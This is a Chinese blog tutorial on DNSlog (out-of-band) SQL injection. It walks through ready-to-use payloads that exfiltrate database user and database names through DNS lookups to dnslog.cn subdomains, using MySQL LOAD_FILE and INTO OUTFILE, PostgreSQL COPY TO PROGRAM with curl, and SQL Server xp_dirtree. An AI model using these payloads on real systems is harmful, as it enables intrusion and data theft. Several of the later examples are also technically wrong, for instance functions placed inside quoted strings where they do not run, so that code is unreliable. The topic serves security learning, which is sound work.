---
title: "SQL 注入之 DNS 注入：利用 DNS 带外查询突破盲注限制"
date: "2024-12-22 10:14:57"
updated: "2026-05-30 19:28:12"
categories: ["文章", "学习笔记"]
tags: ["SQL 注入", "DNSlog"]
thumbnail: ""
first_image_as_thumbnail: true
excerpt: ""
after_post: ""
comments: true
wp_id: "790"
---
<div class="inter-jQQQ8P">
<div class="container-PrUkKo">
<div class="item-hGGxLi">
<div class="container-arOxqB chrome70-container">
<div class="inner-FyM8gE inner-item-swzCut" data-target-id="message-box-target-id" data-testid="union_message">
<div class="message-block-container-aFugD6" data-testid="message-block-container">
<div class="flex flex-row w-full w-full max-w-full s-font-base text-s-color-text-secondary p-0 rounded-s-radius-s bg-transparent group data-[attr=select-mode]:-mt-10 data-[attr=select-mode]:py-10 data-[attr=select-mode]:px-16 data-[attr=select-mode]:sm:p-10 data-[attr=select-mode]:hover:bg-s-color-bg-base data-[attr=select-mode]:hover:rounded-s-radius-xs data-[attr=select-mode]:has-[:checked]:bg-s-color-bg-trans data-[attr=select-mode]:has-[:checked]:rounded-s-radius-xs data-[attr=select-mode]:pointer-events-none" data-testid="receive_message">
<div class="flex flex-col flex-grow max-w-full min-w-0">
<div class="flex flex-row w-full" data-testid="message_content" data-message-id="15936664570634242">
<div class="w-full" data-plugin-identifier="Symbol(receive-write-text-content)">
<div class="container-ZYIsnH flow-markdown-body theme-samantha-Nbr9UN" dir="ltr" data-testid="message_text_content" data-show-indicator="false">
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">在 Web 安全测试中，当遇到 SQL 注入但无法通过联合查询直接获取数据时，盲注往往是无奈之选。但手工盲注效率极低，自动化工具又可能因频繁请求被封 IP。此时，<strong>DNSlog 注入（DNS 带外查询）</strong> 作为一种巧妙的注入姿势，能通过 DNS 解析记录 “带外” 获取数据，成为突破困境的关键技术。本文将深入解析 DNS 注入的原理、工具与实战技巧。</div>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">一、什么是 DNSlog 注入？</h2>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">DNSlog 注入本质是一种<strong>带外数据获取技术</strong>，核心逻辑是：通过构造特殊 SQL 语句，让数据库在执行时主动发起 DNS 查询，查询的域名中包含我们需要获取的数据（如数据库名、用户名等）。之后，通过查看 DNS 服务器的解析日志，即可从域名中提取目标数据。</div>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">与传统盲注相比，它的优势在于：</div>
<ul class="auto-hide-last-sibling-br">
 	<li>无需逐字符猜解，可批量获取数据；</li>
 	<li>减少与目标服务器的直接交互，降低被封禁风险；</li>
 	<li>适用于 “布尔盲注”“时间盲注” 等难以直接回显的场景。</li>
</ul>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">二、核心工具：LOAD_FILE () 函数与 DNSlog 平台</h2>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">DNS 注入的实现依赖两个关键要素：数据库的文件读取函数（如 MySQL 的<code>LOAD_FILE()</code>）和可控的 DNSlog 平台（用于接收解析记录）。</div>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">1. MySQL 的 LOAD_FILE () 函数：数据带出的核心</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><code>LOAD_FILE()</code>是 MySQL 中用于读取文件并返回内容的函数，但在 DNS 注入中，它的作用是<strong>触发 DNS 查询</strong>—— 当传入的路径是一个域名时，MySQL 会尝试解析该域名，从而将数据 “嵌入” 域名中发送到 DNS 服务器。</div>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">使用<code>LOAD_FILE()</code>的前提条件：</h4>
<ul class="auto-hide-last-sibling-br">
 	<li><strong><code>secure_file_priv</code>配置为空</strong>：<br class="container-utlnW2 wrapper-d0Cc1k undefined" />通过<code>show global variables like &#039;%secure_file_priv%&#039;;</code>查看，其值决定了<code>LOAD_FILE()</code>的权限：
<ul class="auto-hide-last-sibling-br">
 	<li><code>NULL</code>：禁止所有导入导出（无法使用）；</li>
 	<li>具体路径：仅允许操作指定目录（需路径匹配）；</li>
 	<li>空值（<code>&#039;&#039;</code>）：无限制（最理想状态）。</li>
</ul>
</li>
 	<li><strong>拥有 FILE 权限</strong>：数据库用户需具备<code>FILE</code>权限才能调用<code>LOAD_FILE()</code>。</li>
 	<li><strong>路径格式正确</strong>：需使用完整路径，在 Windows 下常用 UNC 路径（如<code>//domain/path</code>），Linux 下可结合协议（如<code>http://domain</code>）。</li>
 	<li><strong>文件大小限制</strong>：读取内容需小于<code>max_allowed_packet</code>（默认 1MB），但 DNS 注入中仅需触发解析，无需实际读取文件内容。</li>
</ul>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">2. DNSlog 平台：接收数据的 “信使”</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">DNSlog 平台是提供可控子域名的服务（如<code>dnslog.cn</code>、<code>ceye.io</code>），用户可获取一个专属子域名（如<code>qn8lya.dnslog.cn</code>），当目标服务器解析该子域名的衍生域名（如<code>test.qn8lya.dnslog.cn</code>）时，平台会记录解析日志，从而获取嵌入的信息。</div>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">常用平台：</div>
<ul class="auto-hide-last-sibling-br">
 	<li><a class="link-ZNPgAX" href="https://dnslog.org" target="_blank" rel="noopener">DNSlog.org</a></li>
 	<li><a class="link-ZNPgAX" href="https://ceye.io/" target="_blank" rel="noopener">Ceye.io</a></li>
 	<li><a class="link-ZNPgAX" href="https://portswigger.net/burp/documentation/collaborator" target="_blank" rel="noopener">Burp Suite Collaborator</a></li>
</ul>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">三、UNC 路径：跨系统的路径适配关键</h2>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><code>LOAD_FILE()</code>触发 DNS 查询的核心是 “路径解析”，而<strong>UNC 路径</strong>（通用命名规则）是 Windows 下的关键，Linux 则需结合协议绕过，二者的适配直接影响注入成功率。</div>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">1. Windows 系统的 UNC 路径</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">UNC 路径格式为<code>\\servername\sharename</code>（或<code>//servername/sharename</code>，推荐后者），其中<code>servername</code>可替换为域名。当<code>LOAD_FILE()</code>传入<code>//xxx.dnslog.cn/any</code>时，Windows 会优先解析<code>xxx.dnslog.cn</code>，从而触发 DNS 查询。</div>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">示例：<br class="container-utlnW2 wrapper-d0Cc1k undefined" /><code>LOAD_FILE(&#039;//user_info.qn8lya.dnslog.cn/aaa&#039;)</code><br class="container-utlnW2 wrapper-d0Cc1k undefined" />此时，<code>user_info.qn8lya.dnslog.cn</code>会被解析，<code>user_info</code>即为我们要带出的数据。</div>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">2. Linux 系统的适配方案</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">Linux 默认不支持 UNC 路径（依赖 SMB 服务），但可通过<code>http</code>/<code>ftp</code>协议触发域名解析。例如：<br class="container-utlnW2 wrapper-d0Cc1k undefined" /><code>LOAD_FILE(&#039;http://user_info.rfyqg3.dnslog.cn&#039;)</code><br class="container-utlnW2 wrapper-d0Cc1k undefined" />MySQL 会解析<code>http://</code>后的域名，从而触发 DNS 请求（需 MySQL 版本支持远程 URL 解析）。</div>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">四、DNS 注入实战步骤</h2>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">以 MySQL 为例，完整流程分为 3 步，核心是将目标数据嵌入 DNS 域名并触发解析。</div>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">步骤 1：获取 DNSlog 子域名</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">在 DNSlog 平台注册后，获取专属子域名，例如<code>qn8lya.dnslog.cn</code>（后续所有衍生域名均基于此）。</div>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">步骤 2：构造注入语句，嵌入目标数据</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">假设要获取数据库用户名（<code>user()</code>），需将其作为子域名的一部分，通过<code>LOAD_FILE()</code>触发解析。</div>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">基础语句（无特殊字符时）：</h4>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">id=1&#039; and load_file(concat(&#039;//&#039;,user(),&#039;.qn8lya.dnslog.cn/aaa&#039;)) -- s</code>
```


</div>
</div>
</div>
</div>
<ul class="auto-hide-last-sibling-br">
 	<li><code>concat()</code>用于拼接字符串，将<code>user()</code>的结果作为子域名前缀；</li>
 	<li><code>-- s</code>用于注释后续 SQL，避免语法错误。</li>
</ul>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">处理特殊字符：Hex 编码转换</h4>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><code>user()</code>的结果可能包含<code>@</code>（如<code>root@localhost</code>），而<code>@</code>是 DNS 域名中的非法字符，会导致解析失败。此时需用<code>hex()</code>函数将数据转为十六进制：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="action-tEcs3i">
<div class="hoverable-sPLxOT" tabindex="0" aria-describedby="63lm7k7" data-popupid="63lm7k7"></div>
</div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">id=1&#039; and load_file(concat(&#039;//&#039;,hex(user()),&#039;.rfyqg3.dnslog.cn/xxx&#039;)) -- s</code>
```


</div>
</div>
</div>
</div>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">步骤 3：查看 DNS 日志并解码</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">在 DNSlog 平台刷新日志，会看到类似<code>726f6f74406c6f63616c686f7374.rfyqg3.dnslog.cn</code>的解析记录，其中<code>726f6f74406c6f63616c686f7374</code>即为<code>user()</code>的十六进制结果。</div>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">通过 MySQL 的<code>unhex()</code>函数解码：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">select unhex(&quot;726f6f74406c6f63616c686f7374&quot;); 
-- 结果：root@localhost</code>
```


</div>
</div>
</div>
</div>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">五、LOAD_FILE () 禁用时的替代方案</h2>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">若<code>LOAD_FILE()</code>被限制，可根据数据库类型选择其他带外查询方式：</div>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">1. MySQL：INTO OUTFILE 写入远程路径</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">通过<code>INTO OUTFILE</code>写入远程 FTP 路径，触发域名解析：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">select &#039;test&#039; into outfile &#039;ftp://hex(database()).xxx.dnslog.cn/tmp.txt&#039;</code>
```


</div>
</div>
</div>
</div>
<ul class="auto-hide-last-sibling-br">
 	<li><code>hex(database())</code>将当前数据库名转为十六进制，作为子域名前缀；</li>
 	<li>MySQL 会解析<code>ftp://</code>后的域名，日志中可提取数据库名。</li>
</ul>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">2. PostgreSQL：COPY 命令执行系统命令</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">PostgreSQL 的<code>COPY</code>可调用系统命令（如<code>curl</code>），访问可控域名：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">COPY (select current_database()) TO PROGRAM &#039;curl http://&#039;||hex(current_user())||&#039;.xxx.dnslog.cn&#039;</code>
```


</div>
</div>
</div>
</div>
<ul class="auto-hide-last-sibling-br">
 	<li><code>current_database()</code>获取当前数据库名，<code>current_user()</code>获取当前用户；</li>
 	<li><code>||</code>用于字符串拼接，<code>curl</code>访问构造的 URL，触发 DNS 解析。</li>
</ul>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">3. SQL Server：xp_dirtree 列出远程目录</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">SQL Server 的<code>xp_dirtree</code>可列出远程目录，解析域名时带出数据：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">exec master..xp_dirtree &#039;\\hex(user()).xxx.dnslog.cn\share&#039;</code>
```


</div>
</div>
</div>
</div>
<ul class="auto-hide-last-sibling-br">
 	<li><code>xp_dirtree</code>会解析<code>\\</code>后的域名，<code>hex(user())</code>将用户名转为十六进制；</li>
 	<li>解析日志中可提取用户名的十六进制值。</li>
</ul>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">六、总结与注意事项</h2>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">DNSlog 注入通过 “带外查询” 巧妙避开了直接数据回显的限制，是盲注场景下的高效技术，但需注意：</div>
<ol class="auto-hide-last-sibling-br">
 	<li><strong>权限依赖</strong>：多数方法依赖数据库高权限（如 FILE 权限、系统命令执行权限）；</li>
 	<li><strong>特殊字符处理</strong>：务必用<code>hex()</code>等函数处理特殊字符，避免 DNS 解析失败；</li>
 	<li><strong>跨系统差异</strong>：Windows 优先用 UNC 路径，Linux 结合<code>http</code>/<code>ftp</code>协议；</li>
 	<li><strong>平台选择</strong>：优先使用稳定的 DNSlog 平台，避免解析延迟或日志丢失。</li>
</ol>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
